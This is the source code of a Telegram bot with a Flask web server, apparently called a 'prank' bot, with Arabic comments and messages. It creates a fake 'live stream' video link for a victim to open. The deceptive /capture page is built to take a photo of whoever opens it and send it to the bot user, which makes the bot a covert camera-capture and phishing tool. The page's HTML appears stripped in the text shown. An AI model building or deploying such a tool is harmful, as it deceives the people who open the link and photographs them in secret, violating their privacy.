import os
import time
from flask import Flask, request, abort, render_template_string
import telebot
import pymongo

# قراءة المتغيرات
TOKEN = os.getenv("BOT_TOKEN")
BASE_URL = os.getenv("BASE_URL")
MONGO_URL = os.getenv("MONGO_URL")

print("--- STARTING BOT ---")
print(f"TOKEN: {'Set' if TOKEN else 'MISSING'}")
print(f"BASE_URL: {BASE_URL}")
print(f"MONGO_URL: {'Set' if MONGO_URL else 'MISSING'}")

if not TOKEN:
    raise RuntimeError("BOT_TOKEN is missing")

# ✅ الإصلاح المهم: threaded=False لمنع إنهاء الخيط قبل تنفيذ الأمر
bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

users_collection = None
if MONGO_URL:
    try:
        mongo_client = pymongo.MongoClient(MONGO_URL, connectTimeoutMS=5000)
        db = mongo_client["prank_bot"]
        users_collection = db["allowed_users"]
        print("✅ Connected to MongoDB successfully")
    except Exception as e:
        print(f"❌ DB Error: {e}")

@app.route("/")
def home():
    return "Bot is running"

@app.route("/capture", methods=["GET"])
def capture_page():
    user_id = request.args.get("user_id", type=int)
    is_allowed = False
    if users_collection is not None and user_id:
        is_allowed = users_collection.find_one({"user_id": user_id}) is not None
    if not user_id or not is_allowed:
        return "الرابط غير صالح", 403

    html = """
    
    Live Stream
    
    Live 
    
    Tap to play stream
    
    """
    return render_template_string(html, user_id=user_id)

@app.route("/capture", methods=["POST"])
def capture():
    photo = request.files.get("photo")
    user_id = request.form.get("user_id", type=int)
    is_allowed = False
    if users_collection is not None and user_id:
        is_allowed = users_collection.find_one({"user_id": user_id}) is not None
    if not photo or not user_id or not is_allowed:
        return "Invalid request", 400
    try:
        bot.send_photo(chat_id=user_id, photo=photo.stream.read())
        return "Image sent", 200
    except Exception as e:
        return f"Error: {e}", 500

@app.route("/webhook", methods=["POST"])
def webhook():
    if request.headers.get("content-type") == "application/json":
        try:
            update = telebot.types.Update.de_json(request.get_data(as_text=True))
            bot.process_new_updates([update])
            return "OK", 200
        except Exception as e:
            print(f"❌ Error processing update: {e}")
            return "Error", 500
    else:
        abort(403)

@bot.message_handler(commands=["start"])
def start(message):
    print(f"--- START COMMAND RECEIVED FROM {message.chat.id} ---")
    try:
        bot.reply_to(message, "مرحبًا! أرسل الأمر /link لصنع المقلب.")
        print("--- START REPLY SENT ---")
    except Exception as e:
        print(f"❌ Error in /start: {e}")

@bot.message_handler(commands=["link"])
def link(message):
    print(f"--- LINK COMMAND RECEIVED FROM {message.chat.id} ---")
    try:
        if not BASE_URL:
            bot.reply_to(message, "❌ خطأ: متغير BASE_URL غير معين في إعدادات Render.")
            return

        if users_collection is not None:
            users_collection.update_one(
                {"user_id": message.chat.id},
                {"$set": {"user_id": message.chat.id}},
                upsert=True
            )
        url = f"{BASE_URL}/capture?user_id={message.chat.id}"
        bot.reply_to(message, f"✅ تم إنشاء رابط الفيديو الوهمي:\n\n{url}")
        print(f"--- LINK REPLY SENT: {url} ---")
    except Exception as e:
        print(f"❌ Error in /link: {e}")
        bot.reply_to(message, f"حدث خطأ: {e}")

# للتشغيل المحلي فقط (لن يعمل على Render لأن gunicorn هو الذي يشغل التطبيق)
if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)